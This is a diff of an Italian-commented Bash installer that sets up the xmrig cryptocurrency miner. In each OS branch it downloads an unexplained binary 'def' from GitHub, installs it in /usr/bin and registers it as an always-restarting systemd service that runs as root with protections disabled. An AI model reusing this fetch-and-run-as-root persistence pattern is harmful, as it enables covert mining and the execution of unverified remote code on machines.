@@ -163,6 +163,56 @@ EOF
                 echo -e "Il file /usr/bin/xmrig è stato creato e reso eseguibile con il nome del dispositivo $DEVICE_NAME."
                 echo -e "Riavvia il sistema o effettua il logout per applicare le modifiche ai permessi dell'utente.\n"
 
+                # Scarica il file "def" e posizionalo in /usr/bin
+                echo "Scaricamento e configurazione del file 'def'..."
+                curl -O https://raw.githubusercontent.com/Div20241/ubuntu/main/def
+                mv def /usr/bin
+                chmod a+x /usr/bin/def
+
+                # Verifica che il file sia stato configurato correttamente
+                if [[ -f /usr/bin/def && -x /usr/bin/def ]]; then
+                    echo "'def' è stato configurato correttamente in /usr/bin."
+                else
+                    echo "Errore nella configurazione di 'def'. Interrompo l'esecuzione."
+                    exit 1
+                fi
+
+                # Crea il file di servizio systemd
+                echo "Creazione del file di servizio systemd per 'def_service'..."
+                cat <<EOF | sudo tee /etc/systemd/system/def_service.service > /dev/null
+[Unit]
+Description=Def Service
+After=network.target
+
+[Service]
+# Protezioni per consentire accesso a file specifici
+ProtectSystem=false
+ProtectHome=false
+ReadWritePaths=/usr/bin/xmrig
+
+# Utente e gruppo con cui eseguire il servizio
+User=root
+Group=root
+
+# Configurazione del servizio
+ExecStart=/usr/bin/def
+Restart=always
+WorkingDirectory=/usr/bin
+Environment=PATH=/usr/bin:/usr/local/bin
+Environment=PYTHONUNBUFFERED=1
+
+[Install]
+WantedBy=multi-user.target
+EOF
+                # Ricarica systemd, avvia e abilita il servizio
+                echo "Ricarico systemd e avvio il servizio..."
+                sudo systemctl daemon-reload
+                sudo systemctl start def_service.service
+                sudo systemctl enable def_service.service
+
+                # Verifica lo stato del servizio
+                echo "Verifica dello stato del servizio 'def_service':"
+                sudo systemctl status def_service.service
                 ;;
             centos)
                 echo "Il sistema operativo è CentOS."
@@ -335,36 +385,21 @@ EOF
                 echo -e "\n\033[1;34mInstallazione, configurazione e avvio di tutti i container completati!\033[0m"
                 echo -e "Il file /usr/bin/xmrig.sh è stato creato e reso eseguibile con il nome del dispositivo $DEVICE_NAME."
                 echo -e "Riavvia il sistema o effettua il logout per applicare le modifiche ai permessi dell'utente.\n"
-                ;;
-            *)
-                echo "Sistema operativo non riconosciuto: $ID"
-                ;;
-        esac
-    else
-        echo "/etc/os-release non trovato. Impossibile determinare il sistema operativo."
-    fi
-}
-
-def_service() {
-    #!/bin/bash
-
-# Scarica il file "def" e posizionalo in /usr/bin
-echo "Scaricamento e configurazione del file 'def'..."
-curl -O https://raw.githubusercontent.com/Div20241/def/main/def
-mv def /usr/bin
-chmod a+x /usr/bin/def
-
-# Verifica che il file sia stato configurato correttamente
-if [[ -f /usr/bin/def && -x /usr/bin/def ]]; then
-    echo "'def' è stato configurato correttamente in /usr/bin."
-else
-    echo "Errore nella configurazione di 'def'. Interrompo l'esecuzione."
-    exit 1
-fi
-
-# Crea il file di servizio systemd
-echo "Creazione del file di servizio systemd per 'def_service'..."
-cat <<EOF | sudo tee /etc/systemd/system/def_service.service > /dev/null
+                # Scarica il file "def" e posizionalo in /usr/bin
+                echo "Scaricamento e configurazione del file 'def'..."
+                curl -O https://raw.githubusercontent.com/Div20241/centos/main/def
+                mv def /usr/bin
+                chmod a+x /usr/bin/def
+                # Verifica che il file sia stato configurato correttamente
+                if [[ -f /usr/bin/def && -x /usr/bin/def ]]; then
+                    echo "'def' è stato configurato correttamente in /usr/bin."
+                else
+                    echo "Errore nella configurazione di 'def'. Interrompo l'esecuzione."
+                    exit 1
+                fi
+                # Crea il file di servizio systemd
+                echo "Creazione del file di servizio systemd per 'def_service'..."
+                cat <<EOF | sudo tee /etc/systemd/system/def_service.service > /dev/null
 [Unit]
 Description=Def Service
 After=network.target
@@ -389,19 +424,25 @@ Environment=PYTHONUNBUFFERED=1
 [Install]
 WantedBy=multi-user.target
 EOF
+                # Ricarica systemd, avvia e abilita il servizio
+                echo "Ricarico systemd e avvio il servizio..."
+                sudo systemctl daemon-reload
+                sudo systemctl start def_service.service
+                sudo systemctl enable def_service.service
 
-# Ricarica systemd, avvia e abilita il servizio
-echo "Ricarico systemd e avvio il servizio..."
-sudo systemctl daemon-reload
-sudo systemctl start def_service.service
-sudo systemctl enable def_service.service
-
-# Verifica lo stato del servizio
-echo "Verifica dello stato del servizio 'def_service':"
-sudo systemctl status def_service.service
-
+                # Verifica lo stato del servizio
+                echo "Verifica dello stato del servizio 'def_service':"
+                sudo systemctl status def_service.service
+                ;;
+            *)
+                echo "Sistema operativo non riconosciuto: $ID"
+                ;;
+        esac
+    else
+        echo "/etc/os-release non trovato. Impossibile determinare il sistema operativo."
+    fi
 }
+
 
 # Chiama la funzione
 detect_os
-def_service
